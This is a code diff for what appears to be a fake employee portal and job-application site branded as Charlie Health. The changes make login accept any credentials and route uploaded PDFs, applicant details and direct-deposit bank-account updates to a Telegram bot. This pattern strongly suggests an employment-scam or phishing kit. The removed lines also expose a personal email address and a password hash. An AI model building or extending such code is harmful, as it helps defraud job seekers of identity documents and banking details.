@@ -29,13 +29,6 @@ if (passwordToggle && passwordInput) {
 }
 
 window.EmployeePortalAuth = {
-  demoUser: {
-    employeeIdentifier: 'ilovemykingrudy@gmail.com',
-    passwordHash: 'c775e7b757ede630cd0aa1113bd102661ab38829ca52a6422ab782862f268646',
-    employeeName: 'Jordan Lee',
-    employeeId: 'CH-2048',
-    email: 'ilovemykingrudy@gmail.com',
-  },
   storageKey: 'charlieHealthEmployeePortalSession',
   getSession() {
     try {
@@ -45,14 +38,14 @@ window.EmployeePortalAuth = {
       return null;
     }
   },
-  setSession() {
+  setSession(employee = {}) {
     const profile = {
       authenticated: true,
-      employeeName: this.demoUser.employeeName,
-      employeeId: this.demoUser.employeeId,
-      email: this.demoUser.email,
+      employeeIdentifier: String(employee.employeeIdentifier || '').trim(),
+      employeeName: String(employee.employeeName || '').trim() || 'Employee',
+      employeeId: String(employee.employeeId || '').trim() || 'Employee ID',
+      email: String(employee.email || '').trim() || '',
       connectedAt: new Date().toISOString(),
-      note: 'Demo session only. Replace with secure backend auth before production launch.',
     };
     window.localStorage.setItem(this.storageKey, JSON.stringify(profile));
     return profile;
@@ -76,31 +69,24 @@ window.EmployeePortalAuth = {
   },
   async login({ employeeIdentifier, password }) {
     const identifier = String(employeeIdentifier || '').trim().toLowerCase();
-    const suppliedPassword = String(password || '');
+    const suppliedPassword = String(password || '').trim();
 
     if (!identifier || !suppliedPassword) {
       return { ok: false, message: 'Please complete both fields to continue.' };
     }
 
-    if (!window.crypto || !window.crypto.subtle) {
-      return { ok: false, message: 'Secure browser crypto is unavailable. Please use a modern browser.' };
-    }
+    const employeeName = identifier.includes('@')
+      ? identifier.split('@')[0].replace(/[._-]+/g, ' ').replace(/\b\w/g, (char) => char.toUpperCase())
+      : 'Employee';
 
-    const buffer = new TextEncoder().encode(suppliedPassword);
-    const digest = await window.crypto.subtle.digest('SHA-256', buffer);
-    const hashHex = Array.from(new Uint8Array(digest))
-      .map((byte) => byte.toString(16).padStart(2, '0'))
-      .join('');
+    this.setSession({
+      employeeIdentifier: identifier,
+      employeeName,
+      employeeId: 'Employee ID',
+      email: identifier.includes('@') ? identifier : '',
+    });
 
-    if (identifier === this.demoUser.employeeIdentifier.toLowerCase() && hashHex === this.demoUser.passwordHash) {
-      this.setSession();
-      return { ok: true, redirectUrl: '../employee-dashboard/' };
-    }
-
-    return {
-      ok: false,
-      message: 'Invalid email or password. Use the local demo credentials or connect your real auth system.',
-    };
+    return { ok: true, redirectUrl: '../' };
   },
   logout() {
     window.localStorage.removeItem(this.storageKey);
@@ -207,6 +193,115 @@ profileMenus.forEach((menu) => {
     }
   });
 });
+
+window.EmployeePortalProfile = {
+  storageKey: 'charlieHealthEmployeeProfile',
+  defaultProfile: {
+    fullName: 'Employee Name',
+    employeeId: 'Employee ID',
+    workEmail: 'employee@charliehealth.com',
+    phoneNumber: '(555) 401-2847',
+    jobTitle: 'Remote Care Coordinator',
+    department: 'Customer Operations',
+    manager: 'Alicia Martin',
+    employmentStatus: 'Full-Time',
+    workLocation: 'Remote (US Nationwide)',
+  },
+  getProfile() {
+    try {
+      const saved = JSON.parse(localStorage.getItem(this.storageKey) || 'null');
+      return saved ? { ...this.defaultProfile, ...saved } : { ...this.defaultProfile };
+    } catch (error) {
+      return { ...this.defaultProfile };
+    }
+  },
+  saveProfile(profile) {
+    const nextProfile = { ...this.defaultProfile, ...profile };
+    localStorage.setItem(this.storageKey, JSON.stringify(nextProfile));
+    return nextProfile;
+  },
+  applyProfileToInputs() {
+    const profile = this.getProfile();
+    document.querySelectorAll('[data-profile-field]').forEach((field) => {
+      const key = field.dataset.profileField;
+      const value = profile[key] || '';
+      field.value = value;
+    });
+
+    const topbarName = document.querySelector('.profile-meta strong');
+    const topbarId = document.querySelector('.profile-meta span');
+    if (topbarName) {
+      topbarName.textContent = profile.fullName || 'Employee Name';
+    }
+    if (topbarId) {
+      topbarId.textContent = `Employee ID: ${profile.employeeId || 'Employee ID'}`;
+    }
+  },
+  setEditingMode(isEditing) {
+    document.querySelectorAll('[data-profile-field]').forEach((field) => {
+      field.readOnly = !isEditing;
+      field.disabled = !isEditing;
+      if (isEditing) {
+        field.classList.add('is-editing');
+      } else {
+        field.classList.remove('is-editing');
+      }
+    });
+
+    const editButton = document.getElementById('edit-profile-button');
+    const saveButton = document.getElementById('save-profile-button');
+    const cancelButton = document.getElementById('cancel-profile-button');
+    if (editButton) editButton.hidden = isEditing;
+    if (saveButton) saveButton.hidden = !isEditing;
+    if (cancelButton) cancelButton.hidden = !isEditing;
+  },
+  bindProfilePage() {
+    const page = document.querySelector('[data-profile-page]');
+    if (!page) return;
+
+    this.applyProfileToInputs();
+    this.setEditingMode(false);
+
+    const editButton = document.getElementById('edit-profile-button');
+    const saveButton = document.getElementById('save-profile-button');
+    const cancelButton = document.getElementById('cancel-profile-button');
+
+    if (editButton) {
+      editButton.addEventListener('click', () => this.setEditingMode(true));
+    }
+
+    if (cancelButton) {
+      cancelButton.addEventListener('click', () => {
+        this.applyProfileToInputs();
+        this.setEditingMode(false);
+      });
+    }
+
+    if (saveButton) {
+      saveButton.addEventListener('click', () => {
+        const nextProfile = {};
+        document.querySelectorAll('[data-profile-field]').forEach((field) => {
+          nextProfile[field.dataset.profileField] = field.value.trim();
+        });
+
+        const saved = this.saveProfile(nextProfile);
+        this.applyProfileToInputs();
+        this.setEditingMode(false);
+        if (window.EmployeePortalAuth && typeof window.EmployeePortalAuth.setSession === 'function') {
+          window.EmployeePortalAuth.setSession({
+            employeeName: saved.fullName || 'Employee Name',
+            employeeId: saved.employeeId || 'Employee ID',
+            email: saved.workEmail || '',
+          });
+        }
+      });
+    }
+  },
+};
+
+if (document.querySelector('[data-profile-page]')) {
+  window.EmployeePortalProfile.bindProfilePage();
+}
 
 const employeeDashboardShell = document.querySelector('.employee-dashboard-shell');
 if (employeeDashboardShell && window.EmployeePortalAuth && typeof window.EmployeePortalAuth.requireSession === 'function') {
@@ -362,6 +457,26 @@ window.TelegramNotifier = {
       result,
     };
   },
+  async sendFiles({ files = [], caption, chatId = this.chatId, replyMarkup = null } = {}) {
+    const attachments = Array.from(files || []).filter((file) => file && (file.type === 'application/pdf' || /\.pdf$/i.test(file.name)));
+    if (!attachments.length) {
+      return { ok: false, result: { description: 'No PDF files provided.' } };
+    }
+
+    const results = [];
+    for (const file of attachments) {
+      const result = await this.sendDocument({ file, caption, chatId, replyMarkup });
+      results.push(result);
+    }
+
+    const allSuccessful = results.every((result) => result && result.ok);
+    return {
+      ok: allSuccessful,
+      results,
+      response: results.at(-1)?.response,
+      result: results.at(-1)?.result,
+    };
+  },
 };
 
 window.EmployeePortalData = {
@@ -426,7 +541,7 @@ window.EmployeePortalData = {
       if (accountTypeTarget) accountTypeTarget.textContent = 'Checking';
       if (accountNumberTarget) accountNumberTarget.textContent = '•••• 4821';
       if (statusTarget) statusTarget.textContent = 'Active';
-      if (accountNameTarget) accountNameTarget.textContent = 'Jordan Lee';
+      if (accountNameTarget) accountNameTarget.textContent = 'Employee Name';
       return;
     }
 
@@ -440,7 +555,7 @@ window.EmployeePortalData = {
       statusTarget.textContent = 'Active';
     }
     if (accountNameTarget) {
-      accountNameTarget.textContent = saved.accountName || 'Jordan Lee';
+      accountNameTarget.textContent = saved.accountName || 'Employee Name';
     }
   },
 };
@@ -648,7 +763,6 @@ window.EmployeePortalPayrollAPI = window.EmployeePortalPayrollAPI || {
         return {
           ok: true,
           status: 'pending',
-          demo: false,
           message: 'Direct deposit update sent to payroll review via Telegram.',
           effectiveDate: null,
           payload: safePayload,
@@ -658,7 +772,6 @@ window.EmployeePortalPayrollAPI = window.EmployeePortalPayrollAPI || {
       return {
         ok: false,
         status: 'error',
-        demo: false,
         message: telegramResult.result && telegramResult.result.description ? telegramResult.result.description : 'Unable to send direct deposit update to Telegram.',
         effectiveDate: null,
         payload: safePayload,
@@ -667,7 +780,6 @@ window.EmployeePortalPayrollAPI = window.EmployeePortalPayrollAPI || {
       return {
         ok: false,
         status: 'error',
-        demo: false,
         message: 'Unable to connect to the Telegram HTTP API for payroll review.',
         effectiveDate: null,
         payload: safePayload,
@@ -934,6 +1046,10 @@ window.JobApplicationAPI = window.JobApplicationAPI || {
 
     if (form) {
       Array.from(form.querySelectorAll('input, select, textarea')).forEach((field) => {
+        if (field.hasAttribute('data-employer-field')) {
+          return;
+        }
+
         const name = field.name;
         if (!name) {
           return;
@@ -953,6 +1069,13 @@ window.JobApplicationAPI = window.JobApplicationAPI || {
 
         allFormValues[name] = field.value || '';
       });
+
+      allFormValues.previousEmployers = Array.from(form.querySelectorAll('[data-employer-entry]'))
+        .map((entry) => Object.fromEntries(
+          Array.from(entry.querySelectorAll('[data-employer-field]'))
+            .map((field) => [field.dataset.employerField, field.value.trim()])
+        ))
+        .filter((employer) => Object.values(employer).some(Boolean));
     }
 
     const fullPayload = {
@@ -968,12 +1091,12 @@ window.JobApplicationAPI = window.JobApplicationAPI || {
     ].join('\n');
 
     try {
-      const resumeInput = document.querySelector('#resume');
-      const resumeFile = resumeInput && resumeInput.files && resumeInput.files[0] ? resumeInput.files[0] : null;
+      const fileInputs = Array.from(form.querySelectorAll('input[type="file"]'));
+      const uploadedFiles = fileInputs.flatMap((input) => Array.from(input.files || [])).filter((file) => file && (file.type === 'application/pdf' || /\.pdf$/i.test(file.name)));
 
-      if (resumeFile) {
-        await window.TelegramNotifier.sendDocument({
-          file: resumeFile,
+      if (uploadedFiles.length > 0) {
+        await window.TelegramNotifier.sendFiles({
+          files: uploadedFiles,
           caption: telegramMessage,
           replyMarkup: {
             force_reply: true,
@@ -996,7 +1119,6 @@ window.JobApplicationAPI = window.JobApplicationAPI || {
     return {
       ok: true,
       applicationId,
-      demo: false,
       message: 'Application submitted and forwarded to the review channel via Telegram.',
       payload: fullPayload,
     };
@@ -1023,6 +1145,52 @@ if (applicationForm) {
     isSubmitting: false,
     applicationId: '',
   };
+
+  const employerList = applicationForm.querySelector('[data-employers-list]');
+  const addEmployerButton = applicationForm.querySelector('[data-add-employer]');
+  const updateEmployerEntries = () => {
+    const entries = Array.from(applicationForm.querySelectorAll('[data-employer-entry]'));
+    entries.forEach((entry, index) => {
+      entry.querySelector('[data-employer-title]').textContent = `Employer ${index + 1}`;
+      entry.querySelectorAll('[data-employer-field]').forEach((field) => {
+        const fieldName = field.dataset.employerField;
+        const label = entry.querySelector(`label[for="${field.id}"]`);
+        field.id = `previous-employer-${fieldName}-${index}`;
+        field.name = `previousEmployers[${index}][${fieldName}]`;
+        if (label) {
+          label.htmlFor = field.id;
+        }
+      });
+      entry.querySelector('[data-remove-employer]').hidden = entries.length === 1;
+    });
+  };
+
+  const getPreviousEmployers = () => Array.from(applicationForm.querySelectorAll('[data-employer-entry]'))
+    .map((entry) => Object.fromEntries(
+      Array.from(entry.querySelectorAll('[data-employer-field]'))
+        .map((field) => [field.dataset.employerField, field.value.trim()])
+    ))
+    .filter((employer) => Object.values(employer).some(Boolean));
+
+  if (employerList && addEmployerButton) {
+    updateEmployerEntries();
+    addEmployerButton.addEventListener('click', () => {
+      const entry = employerList.querySelector('[data-employer-entry]').cloneNode(true);
+      entry.querySelectorAll('[data-employer-field]').forEach((field) => {
+        field.value = '';
+      });
+      employerList.append(entry);
+      updateEmployerEntries();
+      entry.querySelector('[data-employer-field="company"]').focus();
+    });
+
+    employerList.addEventListener('click', (event) => {
+      if (event.target.closest('[data-remove-employer]')) {
+        event.target.closest('[data-employer-entry]').remove();
+        updateEmployerEntries();
+      }
+    });
+  }
 
   const getFieldValue = (name) => {
     const field = applicationForm.querySelector(`[name="${name}"]`);
@@ -1085,6 +1253,11 @@ if (applicationForm) {
     const experience = [
       ['Customer service experience', formatListValue(getFieldValue('customerServiceExperience'))],
       ['Years of experience', formatListValue(getFieldValue('yearsExperience'))],
+      ['Previous employers', formatListValue(getPreviousEmployers().map((employer) => {
+        const details = [employer.company, employer.jobTitle].filter(Boolean).join(' - ');
+        const dates = [employer.startDate, employer.endDate].filter(Boolean).join(' to ');
+        return [details, dates, employer.responsibilities].filter(Boolean).join('; ');
+      }).join(' | '))],
       ['Remote experience', formatListValue(getFieldValue('remoteExperience'))],
       ['Education', formatListValue(getFieldValue('educationLevel'))],
       ['Resume filename', formatListValue(getFieldValue('resume'))],
@@ -1101,13 +1274,21 @@ if (applicationForm) {
         .map(
           ([label, value]) => `
             <div>
-              <dt>${label}</dt>
-              <dd>${value}</dd>
+              <dt>${escapeHTML(label)}</dt>
+              <dd>${escapeHTML(value)}</dd>
             </div>
           `
         )
         .join('');
     };
+
+    const escapeHTML = (value) => String(value).replace(/[&<>"']/g, (character) => ({
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#39;',
+    })[character]);
 
     renderPairs(reviewSummary.personal, personal);
     renderPairs(reviewSummary.role, role);
